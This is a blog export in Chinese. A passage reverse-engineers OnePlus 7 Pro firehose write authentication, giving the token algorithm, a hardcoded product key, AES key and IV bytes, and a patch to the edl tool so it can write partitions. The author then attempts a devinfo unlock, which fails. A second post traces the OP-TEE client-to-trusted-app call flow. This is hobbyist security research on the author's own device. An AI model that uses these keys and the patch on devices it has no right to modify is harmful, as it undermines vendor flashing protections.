<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_MAGIC <span class="meta-string">&quot;ANDROID-BOOT!&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_MAGIC_SIZE 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_VERSION_LEN 64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_VB_PARTITIONS 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_USER_KEY_SIZE 2048</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">unlock_type</span> &#123;</span></span><br><span class="line">  UNLOCK = <span class="number">0</span>,</span><br><span class="line">  UNLOCK_CRITICAL,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">device_info</span> &#123;</span></span><br><span class="line">  CHAR8 magic[DEVICE_MAGIC_SIZE];</span><br><span class="line">  BOOLEAN is_unlocked;</span><br><span class="line">  BOOLEAN is_unlock_critical;</span><br><span class="line">  BOOLEAN is_charger_screen_enabled;</span><br><span class="line">  CHAR8 bootloader_version[MAX_VERSION_LEN];</span><br><span class="line">  CHAR8 radio_version[MAX_VERSION_LEN];</span><br><span class="line">  BOOLEAN verity_mode; <span class="comment">// TRUE = enforcing, FALSE = logging</span></span><br><span class="line">  UINT32 user_public_key_length;</span><br><span class="line">  CHAR8 user_public_key[MAX_USER_KEY_SIZE];</span><br><span class="line">  UINT64 rollback_index[MAX_VB_PARTITIONS];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">usb_composition</span> <span class="title">usb_comp</span>;</span></span><br><span class="line">&#125; DeviceInfo;</span><br><span class="line"><span class="function">EFI_STATUS</span></span><br><span class="line"><span class="function"><span class="title">ReadWriteDeviceInfo</span> <span class="params">(<span class="keyword">vb_device_state_op_t</span> Mode, <span class="keyword">void</span> *DevInfo, UINT32 Sz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  EFI_STATUS Status = EFI_INVALID_PARAMETER;</span><br><span class="line">  QCOM_VERIFIEDBOOT_PROTOCOL *VbIntf;</span><br><span class="line"></span><br><span class="line">  Status = gBS-&gt;LocateProtocol (&amp;gEfiQcomVerifiedBootProtocolGuid, <span class="literal">NULL</span>,</span><br><span class="line">                                (VOID **)&amp;VbIntf);</span><br><span class="line">  <span class="keyword">if</span> (Status != EFI_SUCCESS) &#123;</span><br><span class="line">    DEBUG ((EFI_D_ERROR, <span class="string">&quot;Unable to locate VB protocol: %r\\n&quot;</span>, Status));</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Status = VbIntf-&gt;VBRwDeviceState (VbIntf, Mode, DevInfo, Sz);</span><br><span class="line">  <span class="keyword">if</span> (Status != EFI_SUCCESS) &#123;</span><br><span class="line">    DEBUG ((EFI_D_ERROR, <span class="string">&quot;VBRwDevice failed with: %r\\n&quot;</span>, Status));</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"># VerifiedBoot Protocol</span><br><span class="line">gEfiQcomVerifiedBootProtocolGuid =    &#123; <span class="number">0x8e5eff91</span>, <span class="number">0x21b6</span>, <span class="number">0x47d3</span>, &#123; <span class="number">0xaf</span>, <span class="number">0x2b</span>, <span class="number">0xc1</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xe0</span>, <span class="number">0x20</span>, <span class="number">0xec</span> &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>可以根据这个<code>gEfiQcomVerifiedBootProtocol</code> 去基线中搜到对应的实现，这里就无法展示了。</p>
<p>结合利用FH读出来的devinfo分区:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221102221321664.png" alt="image-20221102221321664"></p>
<p>看来</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">BOOLEAN is_unlocked;</span><br><span class="line">BOOLEAN is_unlock_critical;</span><br></pre></td></tr></table></figure>

<p>都是0，这个和目前未解锁的状态是符合的。</p>
<h2 id="FH读写分区"><a href="#FH读写分区" class="headerlink" title="FH读写分区"></a>FH读写分区</h2><p>这里我本来想用QFIL的，但是一加的firehose显然是自己改过的，只能读，写的话有个认证token，所以考虑了开源实现 <a href="https://github.com/bkerler/edl">edl</a>，这个工具我发现对xiaomi和oneplus有支持，</p>
<p>就在我想着能一把梭实现 <code>r/w</code>的时候，悲剧发生了 :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># jiazhenjie @ mbp in ~/tools/edl on git:01f84bf o [16:54:13] C:1</span></span><br><span class="line">$ python3 edl.py  w devinfo  /Users/jiazhenjie/Downloads/devinfo.bin  --loader=/Users/jiazhenjie/Downloads/prog_firehose_ddr.elf --memory=UFS --lun=4</span><br><span class="line">Qualcomm Sahara / Firehose Client V3.52 (c) B.Kerler 2018-2021.</span><br><span class="line">main - Using loader /Users/jiazhenjie/Downloads/prog_firehose_ddr.elf ...</span><br><span class="line">main - Waiting <span class="keyword">for</span> the device</span><br><span class="line">main - Device detected :)</span><br><span class="line">main - Mode detected: firehose</span><br><span class="line">firehose - Chip serial num: 2360036966 (0x8cab4e66)</span><br><span class="line">firehose - Supported Functions: program,<span class="built_in">read</span>,nop,patch,configure,setbootablestoragedrive,erase,power,firmwarewrite,getstorageinfo,benchmark,emmc,ufs,fixgpt,getsha256digest,gethwversion,getrfversion,getprjversion,setprojmodel,sha256init,sha256final</span><br><span class="line">firehose -</span><br><span class="line">firehose</span><br><span class="line">firehose - [LIB]: Couldn<span class="string">&#x27;t detect MaxPayloadSizeFromTargetinBytes</span></span><br><span class="line"><span class="string">firehose</span></span><br><span class="line"><span class="string">firehose - [LIB]: Couldn&#x27;</span>t detect TargetName</span><br><span class="line">firehose - TargetName=Unknown</span><br><span class="line">firehose - MemoryName=UFS</span><br><span class="line">firehose - Version=1</span><br><span class="line">firehose_client - Supported <span class="built_in">functions</span>:</span><br><span class="line">-----------------</span><br><span class="line">program,<span class="built_in">read</span>,nop,patch,configure,setbootablestoragedrive,erase,power,firmwarewrite,getstorageinfo,benchmark,emmc,ufs,fixgpt,getsha256digest,gethwversion,getrfversion,getprjversion,setprojmodel,sha256init,sha256final</span><br><span class="line">firehose -</span><br><span class="line">Writing to physical partition 4, sector 962718, sectors 1</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/Users/jiazhenjie/tools/edl/edl.py&quot;</span>, line 358, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    base.run()</span><br><span class="line">  File <span class="string">&quot;/Users/jiazhenjie/tools/edl/edl.py&quot;</span>, line 340, <span class="keyword">in</span> run</span><br><span class="line">    fh.handle_firehose(cmd, options)</span><br><span class="line">  File <span class="string">&quot;/Users/jiazhenjie/tools/edl/edl/Library/firehose_client.py&quot;</span>, line 651, <span class="keyword">in</span> handle_firehose</span><br><span class="line">    <span class="keyword">if</span> self.firehose.cmd_program(lun, startsector, filename):</span><br><span class="line">  File <span class="string">&quot;/Users/jiazhenjie/tools/edl/edl/Library/firehose.py&quot;</span>, line 438, <span class="keyword">in</span> cmd_program</span><br><span class="line">    data += self.modules.addprogram()</span><br><span class="line">  File <span class="string">&quot;/Users/jiazhenjie/tools/edl/edl/Library/Modules/init.py&quot;</span>, line 64, <span class="keyword">in</span> addprogram</span><br><span class="line">    <span class="built_in">return</span> self.ops.addprogram()</span><br><span class="line">  File <span class="string">&quot;/Users/jiazhenjie/tools/edl/edl/Library/Modules/oneplus.py&quot;</span>, line 233, <span class="keyword">in</span> addprogram</span><br><span class="line">    pk, token = self.ops.generatetoken(True)</span><br><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> object has no attribute <span class="string">&#x27;generatetoken&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这个需要逆向刷机工具来分析了</p>
<h2 id="逆向MSM-Download"><a href="#逆向MSM-Download" class="headerlink" title="逆向MSM Download"></a>逆向MSM Download</h2><blockquote>
<p>  喜闻乐见的逆向环节</p>
</blockquote>
<h3 id="USB抓包"><a href="#USB抓包" class="headerlink" title="USB抓包"></a>USB抓包</h3><p>因为每次都会发token，所以想着抓个包，如果固定，那就万事大吉，结果发现不固定</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">setprojmodel</span> <span class="attr">token</span>=<span class="string">&quot;C5DB7CFB89D7A9DBB005388A52F8622FC20BDDD89F5CAD8ED42DEA046DE93F079F47021C7C2A8033300F437881B8FA799FE634A0B7876819DC612799A7B2822A4674B4312FC04FFB20CFE4F40CB487FBD8FDA78A9492E8B1AE0FEEBB0A88802497336B98A1DE35B0691AF563F2DED6837333AAAFE62AB576A73667AFA61E874FC0380223C9CFE3360ED9775014F0E921BE2C101DD979132412CB4E196A1CD05BEDFA19B13419F3DC722ECBA7CB54A9EE67930DE7EADCB0A31E272415A5DBF9948C2EB656D9925D35CE66B60ADFB7F66249319F2ABA9050D0C8019090214D595F59D23EEB2D6C65E8218B66134393A350EFAE4DC3030A6B4F7FC7AC576D07FFF2&quot;</span> <span class="attr">pk</span>=<span class="string">&quot;Yc9vlwu65U6PvhYO&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>这两个值并不是固定的，应该是固定算法+一些随机数算出来的</p>
<p>核心逻辑还是在计算这两个值，算是在刷写分区之前的验证工作，根据edl中的代码可知大概的逻辑，辅助逆向就方便多了</p>
<h3 id="token-amp-pk-逆向结果"><a href="#token-amp-pk-逆向结果" class="headerlink" title="token &amp; pk 逆向结果"></a>token &amp; pk 逆向结果</h3><blockquote>
<p>  先把结论放前面</p>
</blockquote>
<ul>
<li>  prodkey固定 b2fad511325185e5</li>
<li>  random_postfix 是随机字符串 // 这个可以写成固定值，反正是刷机工具生成的</li>
<li>  时间戳 随机</li>
<li>  pk 随机</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">head = c4b95538c57df231 </span><br><span class="line">tail = 5b0217457e49381b </span><br><span class="line">cf = <span class="number">0</span></span><br><span class="line">soc_sn = <span class="number">2360036966</span></span><br><span class="line">ModelVerifyPrjName = <span class="number">18821</span></span><br><span class="line">Version = guacamole_21_H<span class="number">.04_190416</span></span><br><span class="line">prodkey = b2fad511325185e5</span><br><span class="line">random_postfix = 随机的<span class="number">16</span>字节字符串</span><br><span class="line"></span><br><span class="line">ModelVerifyHashToken = sha256(prodkey + ModelVerifyPrjName + random_postfix)</span><br><span class="line">secret = sha256(head + ModelVerifyPrjName + cf + soc_sn + Version + 时间戳 + ModelVerifyHashToken + tail)</span><br><span class="line">items = [ModelVerifyPrjName, random_postfix, ModelVerifyHashToken, Version, cf, soc_sn, timestamp, secret]</span><br><span class="line"></span><br><span class="line">pk = 随机<span class="number">16</span>字节字符串 </span><br><span class="line">aeskey = <span class="string">b&quot;\x10\x45\x63\x87\xE3\x7E\x23\x71&quot;</span> + <span class="built_in">bytes</span>(pk, <span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">b&quot;\xA2\xD4\xA0\x74\x0f\xD3\x28\x96&quot;</span></span><br><span class="line">aesiv = <span class="string">b&quot;\x9D\x61\x4A\x1E\xAC\x81\xC9\xB2\xD3\x76\xD7\x49\x31\x03\x63\x79&quot;</span></span><br><span class="line">pdata = <span class="string">&quot;FEF0FFDA0CEF3E6C50E187E4A37D1B7DB860877A5F0ABFEC491DAC8DD5FD7F77D5D2859ADCDABED5B3018929CA10A00E786A675CD19184BB9BF2EF66A19AC234E4FD7EDFA8EB19E039B0FDD7BE0D3BC8DEA2453A6058D5370C923C9C4E632F3DEB1DA9F66F7BEA5B6D050B88C202BD5EEAA654DBF7AF410A14F5CB7DD481AEFAA6175685D565005D21CBBC2D62F860143FFE971F2845B2BD93A03ABDF6EE61F93E35740D8E2A09F89EB702D7E604914F0EDCE86F754FB994C1F82A20A094C8814EAD18FA6F24396A62A9C83D5412A53D740E662B7A9699ACA4352773B2F79374FF764EBC16143578481C0AD01135AE4BBA477C056320F690F4427E0635E91CEE&quot;</span></span><br><span class="line"></span><br><span class="line">token = <span class="built_in">hex</span>(aes_cbc(items, key, iv))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>为什么edl直接刷会失败呢?</p>
<ol>
<li>  没获取到prjid(18821)，所以我在patch里直接硬编码了</li>
<li>  prodkey不对</li>
</ol>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">     def getprodkey(self, projid):</span><br><span class="line"><span class="deletion">-        if projid in [&quot;18825&quot;, &quot;18801&quot;]:  # key_guacamoles, fajiita</span></span><br><span class="line"><span class="addition">+        if projid in [&quot;18825&quot;, &quot;18801&quot;, &quot;18821&quot;]:  # key_guacamoles, fajiita, guacamole</span></span><br><span class="line">             prodkey = &quot;b2fad511325185e5&quot;</span><br><span class="line">         else:  # key_op7t/op8/N10</span><br><span class="line">             prodkey = &quot;7016147d58e8c038&quot;</span><br><span class="line"><span class="meta">@@ -164,7 +165,6 @@</span> class oneplus(metaclass=LogBase):</span><br><span class="line">             rand = int(random.randint(0, 0x100))</span><br><span class="line">             nr = (rand &amp; 0xFF) % 0x3E</span><br><span class="line">             pk += chr(val[nr])</span><br></pre></td></tr></table></figure>



<p>其他地方这个工具都是对的，逆向过程的笔记没整理，也比较简单，没壳没混淆的，找到关键位置慢慢看就行了。</p>
<h2 id="尝试修改分区实现unlock"><a href="#尝试修改分区实现unlock" class="headerlink" title="尝试修改分区实现unlock"></a>尝试修改分区实现unlock</h2><blockquote>
<p>  想模拟一下把ufs吹下来修改后焊回去的操作</p>
</blockquote>
<p>修改了edl之后发现是可以正常写分区的</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221102222117218.png" alt="image-20221102222117218"></p>
<p>修改devinfo之后刷回去，发现还是locked，看来只改这里是不行的， GG~</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221102222156841.png" alt="image-20221102222156841"></p>
<h2 id="VerifiedBoot-Protocol-分析"><a href="#VerifiedBoot-Protocol-分析" class="headerlink" title="VerifiedBoot Protocol 分析"></a>VerifiedBoot Protocol 分析</h2><blockquote>
<p>  abl分析的时候提到了这个protocol，所以想搞清楚为什么失败就要看看这里</p>
</blockquote>
<p>根据<code>boot_images/QcomPkg/Drivers/VerifiedBootDxe/VerifiedBootDxe.inf</code></p>
<p>可知对应的实现在同目录的 <code>VerifiedBootDxe.c</code> 中</p>
<p>这里注册了这个protocol</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">EFI_STATUS</span></span><br><span class="line"><span class="function">EFIAPI</span></span><br><span class="line"><span class="function"><span class="title">VerifiedBootDxeEntryPoint</span><span class="params">(IN EFI_HANDLE ImageHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">                          IN EFI_SYSTEM_TABLE *SystemTable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  EFI_STATUS Status;</span><br><span class="line">  EFI_HANDLE Handle = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  Status = gBS-&gt;InstallMultipleProtocolInterfaces(</span><br><span class="line">      &amp;Handle, &amp;gEfiQcomVerifiedBootProtocolGuid,</span><br><span class="line">      (VOID **)&amp;QCOMVerifiedBootProtocol, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要看的方法是 <code>VBRwDeviceState</code> 对应的是 <code>QCOM_VB_RWDeviceState</code>，这个代码很长就不贴了，只放关键的一部分:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We use devinfo partition when the device is not secure */</span></span><br><span class="line"> AsciiStrnCpy((CHAR8 *)img_name, <span class="string">&quot;devinfo&quot;</span>, AsciiStrLen(<span class="string">&quot;devinfo&quot;</span>));</span><br><span class="line"> <span class="keyword">if</span> (convert_char8_to_char16(img_name, img_label, AsciiStrLen(<span class="string">&quot;devinfo&quot;</span>)) != EFI_SUCCESS) &#123;</span><br><span class="line">   status = RETURN_INVALID_PARAMETER;</span><br><span class="line">   <span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>显然，只有没烧efuse的时候才会用devinfo作为存放是否unlock的标志，这一点也符合预期，至此这次探索基本上就结束了。</p>
<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>我也把firehose和对edl的patch放到了<a href="https://github.com/o0xmuhe/play_with_oneplus7pro">github</a>，过程也确实好玩:) 不过还是有不少没研究到的地方，比如他的verifyboot实现是否安全啥的 -。-</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.droidwin.com/how-to-extract-oneplus-ops-firmware/">https://www.droidwin.com/how-to-extract-oneplus-ops-firmware/</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/427390226">https://zhuanlan.zhihu.com/p/427390226</a></p>
<p><a href="https://github.com/theopolis/uefi-firmware-parser">https://github.com/theopolis/uefi-firmware-parser</a></p>
<p><a href="https://blog.omitol.com/2017/09/30/Bypass-QCOM-Secure-Boot">https://blog.omitol.com/2017/09/30/Bypass-QCOM-Secure-Boot</a></p>
<p><a href="https://tjtech.me/analyze-oem-unlocking-under-android.html">https://tjtech.me/analyze-oem-unlocking-under-android.html</a></p>
<p><a href="https://www.oneplusbbs.com/forum.php?mod=viewthread&amp;tid=4730052">https://www.oneplusbbs.com/forum.php?mod=viewthread&amp;tid=4730052</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Unlock</tag>
        <tag>Qualcomm</tag>
        <tag>EDL</tag>
      </tags>
  </entry>
  <entry>
    <title>optee学习(2) CA&amp;TA调用流程分析</title>
    <url>/2022/10/26/optee%E5%AD%A6%E4%B9%A0-2-CA-TA/</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>  ubuntu22.04 </li>
<li>  ADS + optee-fvp</li>
</ul>
<h2 id="调用流程梳理"><a href="#调用流程梳理" class="headerlink" title="调用流程梳理"></a>调用流程梳理</h2><p>  这里直接从optee-examples中最简单的hello world入手来看的，从宏观上来看整个调用流程是 :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CA --&gt; optee client --&gt; tee driver --&gt; ATF --&gt;  TEE --&gt; TA</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>根据个人的理解画了个省流版本的图，省略了部分调用</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/optee_ca_ta.png" alt="optee_ca_ta"></p>
<h3 id="CA-amp-TA-的工作流程"><a href="#CA-amp-TA-的工作流程" class="headerlink" title="CA &amp; TA 的工作流程"></a>CA &amp; TA 的工作流程</h3><ul>
<li>  CA</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//1. 初始化context用于和TEE交互</span><br><span class="line">res = TEEC_InitializeContext(NULL, &amp;ctx);</span><br><span class="line"></span><br><span class="line">//2. 打开“会话”，此时TEE侧会验证并且加载对应的TA</span><br><span class="line">res = TEEC_OpenSession(&amp;ctx, &amp;sess, &amp;uuid,</span><br><span class="line">                   TEEC_LOGIN_PUBLIC, NULL, NULL, &amp;err_origin);</span><br><span class="line"></span><br><span class="line">//3. 交互，通过invoke command来触发，调用到TA里具体的逻辑</span><br><span class="line">res = TEEC_InvokeCommand(&amp;sess, TA_HELLO_WORLD_CMD_INC_VALUE, &amp;op,</span><br><span class="line">                 &amp;err_origin);</span><br><span class="line"></span><br><span class="line">//4. 使用完毕，关闭“会话”</span><br><span class="line">TEEC_CloseSession(&amp;sess);</span><br><span class="line"></span><br><span class="line">// 5. 释放context对象</span><br><span class="line">TEEC_FinalizeContext(&amp;ctx);</span><br></pre></td></tr></table></figure>

<ul>
<li>  TA </li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 执行的入口，会话的另一端</span><br><span class="line">TA_CreateEntryPoint <span class="comment">// TA加载的时候执行</span></span><br><span class="line">TA_OpenSessionEntryPoint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 交互，业务代码</span><br><span class="line"><span class="function">TEE_Result <span class="title">TA_InvokeCommandEntryPoint</span><span class="params">(<span class="keyword">void</span> __maybe_unused *sess_ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">uint32_t</span> cmd_id,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">uint32_t</span> param_types, TEE_Param params[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)&amp;sess_ctx; <span class="comment">/* Unused parameter */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd_id) &#123;</span><br><span class="line">    <span class="keyword">case</span> TA_HELLO_WORLD_CMD_INC_VALUE:</span><br><span class="line">        <span class="keyword">return</span> inc_value(param_types, params);</span><br><span class="line">    <span class="keyword">case</span> TA_HELLO_WORLD_CMD_DEC_VALUE:</span><br><span class="line">        <span class="keyword">return</span> dec_value(param_types, params);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> TEE_ERROR_BAD_PARAMETERS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 交互完毕，关闭会话</span><br><span class="line">TA_CloseSessionEntryPoint</span><br><span class="line">TA_DestroyEntryPoint</span><br></pre></td></tr></table></figure>

<ul>
<li>  CA 和 TA的对应关系</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">TEEC_OpenSession    -&gt;   TA_CreateEntryPoint</span><br><span class="line">                         TA_OpenSessionEntryPoint</span><br><span class="line"></span><br><span class="line">TEEC_InvokeCommand  -&gt;   TA_InvokeCommandEntryPoint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TEEC_CloseSession   -&gt;   TA_CloseSessionEntryPoint</span><br><span class="line">                         TA_DestroyEntryPoint</span><br><span class="line">                                                                        </span><br></pre></td></tr></table></figure>



<h2 id="源码阅读"><a href="#源码阅读" class="headerlink" title="源码阅读"></a>源码阅读</h2><h3 id="TEEC-InitializeContext"><a href="#TEEC-InitializeContext" class="headerlink" title="TEEC_InitializeContext"></a>TEEC_InitializeContext</h3><p>TEEC_InitializeContext → 打开tee driver，要用于通信了 ，主要是一些初始化的工作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">TEEC_InitializeContext</span></span><br><span class="line"><span class="function">    teec_open_dev</span></span><br><span class="line"><span class="function">        <span class="title">ioctl</span><span class="params">(fd, TEE_IOC_VERSION, &amp;vers)</span></span></span><br></pre></td></tr></table></figure>

<p>注意此时的CMD是 <code>TEE_IOC_VERSION</code>，对应执行的是 <code>tee_ioctl_version</code></p>
<h3 id="TEEC-OpenSession"><a href="#TEEC-OpenSession" class="headerlink" title="TEEC_OpenSession"></a>TEEC_OpenSession</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// context</span></span><br><span class="line"><span class="comment">// tee session</span></span><br><span class="line"><span class="comment">// TA的uuid，唯一</span></span><br><span class="line"><span class="comment">// connection method</span></span><br><span class="line"><span class="comment">// connection data</span></span><br><span class="line"><span class="comment">// operation </span></span><br><span class="line"><span class="comment">// ret </span></span><br><span class="line">TEEC_OpenSession(&amp;ctx, &amp;sess, &amp;uuid, TEEC_LOGIN_PUBLIC, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;err_origin);</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">rc = ioctl(ctx-&gt;fd, TEE_IOC_OPEN_SESSION, &amp;buf_data);</span><br></pre></td></tr></table></figure>

<p>此时CMD是 <code>TEE_IOC_OPEN_SESSION</code>，到tee driver中查看对应的处理逻辑 : </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221112203936455.png" alt="image-20221112203936455"></p>
<p>往后会调用到对应的handler: </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rc = ctx-&gt;teedev-&gt;desc-&gt;ops-&gt;open_session(ctx, &amp;arg, params);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在进TEE之前，传递的参数需要做转换，反过来也是；从REE往TEE走，其实是一个入口 do_call_with_arg，这些<code>operations</code>都定义在：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct optee_ops - OP-TEE driver internal operations</span></span><br><span class="line"><span class="comment"> * @do_call_with_arg:    enters OP-TEE in secure world</span></span><br><span class="line"><span class="comment"> * @to_msg_param:    converts from struct tee_param to OPTEE_MSG parameters</span></span><br><span class="line"><span class="comment"> * @from_msg_param:    converts from OPTEE_MSG parameters to struct tee_param</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * These OPs are only supposed to be used internally in the OP-TEE driver</span></span><br><span class="line"><span class="comment"> * as a way of abstracting the different methogs of entering OP-TEE in</span></span><br><span class="line"><span class="comment"> * secure world.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">optee_ops</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> (*do_call_with_arg)(struct tee_context *ctx,</span><br><span class="line">                struct tee_shm *shm_arg, u_int offs);</span><br><span class="line">    <span class="keyword">int</span> (*to_msg_param)(struct optee *optee,</span><br><span class="line">                struct optee_msg_param *msg_params,</span><br><span class="line">                <span class="keyword">size_t</span> num_params, <span class="keyword">const</span> struct tee_param *params);</span><br><span class="line">    <span class="keyword">int</span> (*from_msg_param)(struct optee *optee, struct tee_param *params,</span><br><span class="line">                  <span class="keyword">size_t</span> num_params,</span><br><span class="line">                  <span class="keyword">const</span> struct optee_msg_param *msg_params);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>直接在目录中搜<code>open_session</code> </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221112204128044.png" alt="image-20221112204128044"></p>
<p>发现有两个实现，这里的话<code>ffa_abi.c</code>中的应该是FF-A标准对应的那个实现，这里直接看smc的那个就行， 即<code>linux/drivers/tee/optee/smc_abi.c </code>里 :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">910</span>      <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="number">911</span>          <span class="class"><span class="keyword">struct</span> <span class="title">arm_smccc_res</span> <span class="title">res</span>;</span></span><br><span class="line"><span class="number">912</span>  </span><br><span class="line"><span class="number">913</span>          trace_optee_invoke_fn_begin(&amp;param);</span><br><span class="line"><span class="number">914</span>          optee-&gt;smc.invoke_fn(param.a0, param.a1, param.a2, param.a3,</span><br><span class="line"><span class="number">915</span>                       param.a4, param.a5, param.a6, param.a7,</span><br><span class="line"><span class="number">916</span>                       &amp;res);</span><br><span class="line"><span class="number">917</span>          trace_optee_invoke_fn_end(&amp;param, &amp;res);</span><br><span class="line"><span class="number">918</span>  </span><br><span class="line"><span class="number">919</span>          <span class="keyword">if</span> (res.a0 == OPTEE_SMC_RETURN_ETHREAD_LIMIT) &#123;</span><br><span class="line"><span class="number">920</span>              <span class="comment">/*</span></span><br><span class="line"><span class="comment">921               * Out of threads in secure world, wait for a thread</span></span><br><span class="line"><span class="comment">922               * become available.</span></span><br><span class="line"><span class="comment">923               */</span></span><br><span class="line"><span class="number">924</span>              optee_cq_wait_for_completion(&amp;optee-&gt;call_queue, &amp;w);</span><br><span class="line"><span class="number">925</span>          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (OPTEE_SMC_RETURN_IS_RPC(res.a0)) &#123;</span><br><span class="line"><span class="number">926</span>              cond_resched();</span><br><span class="line"><span class="number">927</span>              param.a0 = res.a0;</span><br><span class="line"><span class="number">928</span>              param.a1 = res.a1;</span><br><span class="line"><span class="number">929</span>              param.a2 = res.a2;</span><br><span class="line"><span class="number">930</span>              param.a3 = res.a3;</span><br><span class="line"><span class="number">931</span>              optee_handle_rpc(ctx, rpc_arg, &amp;param, &amp;call_ctx);</span><br><span class="line"><span class="number">932</span>          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">933</span>              rc = res.a0;</span><br><span class="line"><span class="number">934</span>              <span class="keyword">break</span>;</span><br><span class="line"><span class="number">935</span>          &#125;</span><br><span class="line"><span class="number">936</span>      &#125;</span><br></pre></td></tr></table></figure>

<p>中间这个 <code>smc.invoke_fn</code>就是通过smc进入到ATF，然后ATF会转发到TEE处理</p>
<p>对于ATF来说，这是一个通过 <code>SMC #0</code> 过来的中断，这是core内部发生的，且异常等级发生了变化，所以应该是到了ATF的第三组向量表的sync中断处理程序处</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221112204311537.png" alt="image-20221112204311537"></p>
<p>这里细节就不深入看了，主要是为了梳理工作流程，ATF里会调用到系统启动的时候注册的optee的tspd来处理，(opteed_smc_handler 函数)</p>
